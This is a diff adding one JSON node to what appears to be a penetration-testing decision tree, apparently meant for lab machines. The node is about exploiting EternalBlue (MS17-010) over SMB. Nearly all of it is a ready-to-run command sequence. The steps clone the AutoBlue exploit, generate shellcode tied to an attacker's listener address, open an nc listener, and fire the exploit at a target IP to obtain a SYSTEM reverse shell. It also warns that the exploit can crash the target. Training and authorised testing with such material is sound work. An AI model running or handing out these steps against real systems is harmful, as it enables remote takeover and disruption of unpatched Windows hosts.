@@ -1,0 +1,18 @@
+{
+  "id": "eternalblue",
+  "phase": "SMB",
+  "title": "EternalBlue (MS17-010)",
+  "body": "Manual exploitation only — no Metasploit. AutoBlue is clean and reliable. Read the script before running.",
+  "cmd": "# AutoBlue-MS17-010 (manual, no MSF)\ngit clone https://github.com/3ndG4me/AutoBlue-MS17-010\ncd AutoBlue-MS17-010\npip install -r requirements.txt\n\n# Generate shellcode\nchmod +x shellcode/shell_prep.sh\n./shellcode/shell_prep.sh\n# Enter LHOST + LPORT when prompted\n\n# Start listener\nnc -nlvp $lport\n\n# Fire exploit\npython3 eternalblue_exploit7.py $ip shellcode/sc_x64.bin\n\n# If x64 fails, try x86\npython3 eternalblue_exploit7.py $ip shellcode/sc_x86.bin",
+  "warn": "AutoBlue can crash the target if it's unstable. Revert the machine if it goes unresponsive.",
+  "choices": [
+    {
+      "label": "Got SYSTEM shell!",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "Exploit unstable — try manual MS17-010 PoC",
+      "next": "searchsploit_web"
+    }
+  ]
+}
